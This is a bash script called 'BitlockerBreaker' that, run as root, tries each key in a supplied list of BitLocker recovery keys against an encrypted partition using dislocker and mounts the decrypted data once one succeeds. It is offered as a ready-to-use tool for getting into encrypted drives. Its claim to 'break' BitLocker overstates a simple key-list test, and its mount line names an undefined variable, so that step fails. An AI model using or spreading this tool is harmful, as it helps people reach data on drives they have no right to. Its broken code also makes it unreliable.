#!/bin/bash
# Tool name: BitlockerBreaker - Break the bitlocker encrypted partition
# Written by: KsrvcO
# Running on: Linux operation systems
# About:
# This tool can break and decrypt the bitlocker encrypted partitions via recovery key bruteforcing.
# Tested on: Windows 11 with TPM and Secure Boot enabled.
# This tool only need dislocker package on linux system.
if ! [ $(id -u) = 0 ]; then
	   echo "Run this tool as root privilege."
	   exit 1
else
reset
echo -e "

[+] BitlockerBreaker - Break the bitlocker encrypted partition
[+] Written by KsrvcO
[+] Contact me: flower.k2000[at]gmail.com

"
read -p "[+] Path for mount (ex: /mnt/bitlocker/): " mntdir
read -p "[+] Path for put decrypted data (ex: /mnt/dec/): " decdir
read -p "[+] Path for your keys list (ex: /home/user/r.keys): " rfiles
read -p "[+] Encrypted partition path (ex: /dev/nvme0n1p5) " prtitionname
mkdir $mntdir
mkdir $decdir
for i in $(cat $rfiles)
do
    cmmd=$(dislocker -v -V $prtitionname -p$i -- $mntdir)
    if [[ $cmmd = *Error* ]]
        then
			echo "Not Found.Trying again..."
        else
        	sleep 1
        	echo "Recovery Key Breaked Successfully."
        	mount -o loop,rw $mntdirdislocker-file $decdir
        	sleep 1
        	echo "Data decrypted and mounted on $decdir"
        	sleep 1
			umount -l $mntdir
			sleep 1
			rm -rf $mntdir
			echo "Temp files deleted."
			exit
    fi
done
fi